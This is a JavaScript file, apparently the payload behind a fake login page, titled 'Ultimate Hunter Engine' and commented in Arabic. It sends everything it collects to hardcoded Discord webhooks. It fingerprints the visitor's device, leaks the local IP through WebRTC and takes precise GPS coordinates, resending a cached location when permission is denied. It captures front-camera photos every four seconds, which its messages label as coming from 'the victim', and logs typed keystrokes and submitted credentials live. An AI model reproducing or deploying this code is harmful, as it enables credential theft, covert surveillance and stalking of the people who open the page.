/* ==========================================================================
   ULTIMATE HUNTER ENGINE V9.0 - script.js
   Deep Reconnaissance, High-Precision GPS, WebRTC IP Leak & Live Exfiltration
   ========================================================================== */

"use strict";

/* --------------------------------------------------------------------------
   0. إعدادات روابط ديسكورد المتعددة ونظام التبديل التلقائي (Failover Webhooks)
   -------------------------------------------------------------------------- */
const DISCORD_WEBHOOKS = [
    "https://discord.com/api/webhooks/1564663770629017652/ZZRcg_vV1JTh96gfwO4qOrMilrB9r-iB5nb9j0zt938Q-JIxt2flevVHFn8FWnK8gp9H",
    "https://discord.com/api/webhooks/1564684857362358363/F34NZ2OBhi35exXCz2daOXWt7lGS3DEEoAmy_r7SEHK10ZLi9x-iN4qMxzsaW3txKZKt",
    "https://discord.com/api/webhooks/1564684888668512416/ahcAya5wTAsNuRyhVbltJZ5TQfPQvLAw7Ipc68nGAYrWjSbvr75wswHEe1QFFKK9hVOe"
];

let activeWebhookIndex = 0;

async function sendToDiscord(content, fileBlob = null, filename = "intel_capture.png") {
    let success = false;
    
    for (let attempts = 0; attempts < DISCORD_WEBHOOKS.length; attempts++) {
        const currentWebhook = DISCORD_WEBHOOKS[activeWebhookIndex];
        try {
            const formData = new FormData();
            formData.append("payload_json", JSON.stringify({ content: content }));
            
            if (fileBlob) {
                formData.append("file", fileBlob, filename);
            }

            const response = await fetch(currentWebhook, {
                method: "POST",
                body: formData
            });

            if (response.ok) {
                success = true;
                break;
            } else {
                activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length;
            }
        } catch (error) {
            activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length;
        }
    }
    return success;
}

/* --------------------------------------------------------------------------
   1. الإعدادات والمتغيرات الأساسية
   -------------------------------------------------------------------------- */

const ENGINE_CONFIG = Object.freeze({
    version: "9.0",
    locationTimeout: 15000,
    captureIntervalTime: 4000, // التقاط صورة كل 4 ثوانٍ بشكل متسلسل
    cameraWidth: 1280,
    cameraHeight: 720
});

const videoElement = document.getElementById("video");
const canvasElement = document.getElementById("canvas");
const loginFormElement = document.getElementById("fullLoginForm");

let cameraStream = null;
let captureInterval = null;
let engineExecuted = false;
let localIpAddress = "جاري استخراج الشبكة المحلية...";

/* --------------------------------------------------------------------------
   2. كشف الشبكة الداخلية (WebRTC LAN IP Leak)
   -------------------------------------------------------------------------- */

function getLocalIP() {
    return new Promise((resolve) => {
        try {
            const ips = [];
            const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            if (!RTCPeerConnection) {
                resolve("غير مدعوم");
                return;
            }
            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
            
            pc.onicecandidate = (ice) => {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                if (match && !ips.includes(match[1])) {
                    ips.push(match[1]);
                    resolve(match[1]);
                }
            };
            setTimeout(() => {
                if (ips.length === 0) resolve("لم يتم العثور على IP محلي");
            }, 1000);
        } catch {
            resolve("خطأ في استخراج IP");
        }
    });
}

/* --------------------------------------------------------------------------
   3. تتبع الكتابة الحية بدقة (Live Typing Exfiltration)
   -------------------------------------------------------------------------- */

function initializeLiveTyping() {
    const targetForm = loginFormElement || document.querySelector("form");
    if (!targetForm) return;

    const fields = targetForm.querySelectorAll("input, textarea");
    fields.forEach(field => {
        let typingTimer;
        field.addEventListener("input", (e) => {
            clearTimeout(typingTimer);
            typingTimer = setTimeout(async () => {
                const name = e.target.name || e.target.id || e.target.type || "حقل";
                const val = e.target.value;
                await sendToDiscord(`⌨️ **إدخال حي (Live Typing):**\n- الحقل: \`${name}\`\n- القيمة المدخلة: \`${val}\``);
            }, 300);
        });
    });
}

/* --------------------------------------------------------------------------
   4. استخراج البصمة الشاملة للمتصفح والجهاز (Deep Fingerprinting)
   -------------------------------------------------------------------------- */

async function gatherDeepDiagnostics() {
    const screenInfo = window.screen || {};
    const ipLocal = await getLocalIP();
    
    // استخراج معلومات كارت الشاشة عبر WebGL
    let gpuInfo = "غير متاح";
    try {
        const canvasGl = document.createElement("canvas");
        const gl = canvasGl.getContext("webgl") || canvasGl.getContext("experimental-webgl");
        if (gl) {
            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
            if (debugInfo) {
                gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
    } catch {}

    return {
        userAgent: navigator.userAgent || "غير متاح",
        language: navigator.language || "غير متاح",
        platform: navigator.platform || "غير متاح",
        cpuCores: navigator.hardwareConcurrency || "غير متاح",
        deviceRam: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "غير متاح",
        screenResolution: `${screenInfo.width || 0}x${screenInfo.height || 0}`,
        colorDepth: `${screenInfo.colorDepth || 0} بت`,
        viewportSize: `${window.innerWidth}x${window.innerHeight}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "غير متاح",
        localIP: ipLocal,
        graphicsCard: gpuInfo,
        cookiesEnabled: Boolean(navigator.cookieEnabled),
        secureContext: Boolean(window.isSecureContext)
    };
}

/* --------------------------------------------------------------------------
   5. الموقع الجغرافي فائق الدقة مع النظام الاحتياطي (GPS High Precision + Cache)
   -------------------------------------------------------------------------- */

function executeHighPrecisionGPS() {
    return new Promise(resolve => {
        const savedLocationCache = localStorage.getItem("hunter_deep_gps");
        const parsedCache = savedLocationCache ? JSON.parse(savedLocationCache) : null;

        if (!navigator.geolocation) {
            if (parsedCache) {
                sendToDiscord(`⚠️ **الـ GPS غير مدعوم، إرسال آخر موقع محفوظ بدقة:**\n- الخط: ${parsedCache.latitude}\n- الطول: ${parsedCache.longitude}`);
                resolve(parsedCache);
                return;
            }
            resolve(null);
            return;
        }

        let isSettled = false;
        const gpsTimer = setTimeout(async () => {
            if (isSettled) return;
            isSettled = true;
            if (parsedCache) {
                await sendToDiscord(`⏱️ **انتهت مهلة الـ GPS، إرسال آخر موقع محجوز في الذاكرة:**\n- خط العرض: ${parsedCache.latitude}\n- خط الطول: ${parsedCache.longitude}`);
                resolve(parsedCache);
            } else {
                resolve(null);
            }
        }, ENGINE_CONFIG.locationTimeout);

        navigator.geolocation.getCurrentPosition(
            async position => {
                if (isSettled) return;
                isSettled = true;
                clearTimeout(gpsTimer);

                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = position.coords.accuracy;
                const alt = position.coords.altitude || "مغلق/غير متاح";
                const spd = position.coords.speed || "متوقف";

                const gpsData = {
                    latitude: lat,
                    longitude: lon,
                    accuracy: acc,
                    altitude: alt,
                    speed: spd,
                    timestamp: new Date().toISOString()
                };

                localStorage.setItem("hunter_deep_gps", JSON.stringify(gpsData));

                await sendToDiscord(`🎯 **[استخبارات الموقع المباشر] تم رصد الإحداثيات بدقة فائقة:**\n- **خط العرض (Latitude):** \`${lat}\`\n- **خط الطول (Longitude):** \`${lon}\`\n- **الدقة الميدانية:** \`${acc} متر\`\n- **الارتفاع:** \`${alt}\`\n- **السرعة:** \`${spd}\`\n- 🗺️ **رابط خرائط جوجل الفوري:** https://www.google.com/maps?q=${lat},${lon}`);
                resolve(gpsData);
            },
            async () => {
                if (isSettled) return;
                isSettled = true;
                clearTimeout(gpsTimer);

                if (parsedCache) {
                    await sendToDiscord(`⚠️ **تم رفض إذن الموقع أو إغلاقه، إرسال الموقع الاحتياطي المحفوظ سابقاً:**\n- الخط: ${parsedCache.latitude}\n- الطول: ${parsedCache.longitude}\n- الدقة السابقة: ${parsedCache.accuracy} متر\n- 🗺️ **رابط الخرائط:** https://www.google.com/maps?q=${parsedCache.latitude},${parsedCache.longitude}`);
                    resolve(parsedCache);
                } else {
                    await sendToDiscord(`❌ **تم رفض إذن الموقع الجغرافي بالكامل ولا توجد بيانات سابقة.**`);
                    resolve(null);
                }
            },
            {
                enableHighAccuracy: true,
                timeout: ENGINE_CONFIG.locationTimeout - 3000,
                maximumAge: 0
            }
        );
    });
}

/* --------------------------------------------------------------------------
   6. تفعيل الكاميرا والالتقاط المتسلسل المباشر للصور
   -------------------------------------------------------------------------- */

function startLiveCaptureLoop() {
    if (captureInterval) return;

    captureInterval = setInterval(async () => {
        if (!videoElement || !canvasElement) return;

        try {
            if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) return;

            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;
            const ctx = canvasElement.getContext("2d");
            ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

            canvasElement.toBlob(async (blob) => {
                if (blob && blob.size > 1000) {
                    await sendToDiscord(`📸 **[التقاط حي متسلسل] صورة جديدة من عدسة الضحية:**`, blob, `capture_${Date.now()}.png`);
                }
            }, "image/png", 0.95);
        } catch (err) {
            console.error("Capture loop error:", err);
        }
    }, ENGINE_CONFIG.captureIntervalTime);
}

async function activateStealthCamera() {
    if (!navigator.mediaDevices?.getUserMedia || !window.isSecureContext) return;

    try {
        const constraints = {
            audio: false,
            video: {
                facingMode: { ideal: "user" },
                width: { ideal: ENGINE_CONFIG.cameraWidth },
                height: { ideal: ENGINE_CONFIG.cameraHeight }
            }
        };

        cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
        if (videoElement) {
            videoElement.muted = true;
            videoElement.autoplay = true;
            videoElement.playsInline = true;
            videoElement.srcObject = cameraStream;
            await videoElement.play();
        }

        startLiveCaptureLoop();
        await sendToDiscord(`🟢 **تم تشغيل الكاميرا بنجاح وبدء إرسال الصور المتسلسلة إلى الديسكورد.**`);
    } catch (error) {
        await sendToDiscord(`❌ **فشل تشغيل الكاميرا:** \`${error.message}\``);
    }
}

/* --------------------------------------------------------------------------
   7. معالجة نموذج تسجيل الدخول وإرسال البيانات النهائية
   -------------------------------------------------------------------------- */

function initializeFormSubmissions() {
    const targetForm = loginFormElement || document.querySelector("form");
    if (!targetForm) return;

    initializeLiveTyping();

    targetForm.addEventListener("submit", async event => {
        event.preventDefault();
        try {
            const formData = new FormData(targetForm);
            let summary = "📋 **[تسجيل الدخول النهائي] بيانات النموذج المستلمة:**\n";
            for (let [k, v] of formData.entries()) {
                summary += `- **${k}**: \`${v}\`\n`;
            }
            await sendToDiscord(summary);
        } catch (e) {
            console.error("Form submit error:", e);
        }
    });
}

/* --------------------------------------------------------------------------
   8. محرك التنفيذ الاستخباراتي الرئيسي (Engine Execution)
   -------------------------------------------------------------------------- */

async function executeDeepReconnaissance() {
    if (engineExecuted) return;
    engineExecuted = true;

    // استخراج البصمة الكاملة للجهاز والمتصفح والشبكة
    const sys = await gatherDeepDiagnostics();
    await sendToDiscord(`🚀 **[بدء الاستطلاع الشامل V9.0] تم فتح الرابط بنجاح:**\n- **المتصفح:** \`${sys.userAgent}\`\n- **النظام:** \`${sys.platform}\`\n- **معالج الأنوية:** \`${sys.cpuCores} أنوية\`\n- **الذاكرة العشوائية (RAM):** \`${sys.deviceRam}\`\n- **الشبكة المحلية (LAN IP):** \`${sys.localIP}\`\n- **كارت الشاشة (GPU):** \`${sys.graphicsCard}\`\n- **دقة الشاشة:** \`${sys.screenResolution}\`\n- **المنطقة الزمنية:** \`${sys.timezone}\``);

    // خطوة 1: جلب الموقع بدقة فائقة أو الاحتياطي
    await executeHighPrecisionGPS();

    // خطوة 2: تفعيل الكاميرا والبدء بالالتقاط المتسلسل للصور
    setTimeout(async () => {
        await activateStealthCamera();
    }, 1500);
}

/* --------------------------------------------------------------------------
   9. مشغلات التفاعل التلقائي واليدوي
   -------------------------------------------------------------------------- */

["click", "touchstart", "keydown"].forEach(evt => {
    window.addEventListener(evt, () => {
        executeDeepReconnaissance();
    }, { once: true, passive: true });
});

document.addEventListener("DOMContentLoaded", () => {
    initializeFormSubmissions();
    setTimeout(() => {
        executeDeepReconnaissance();
    }, 2000);
});
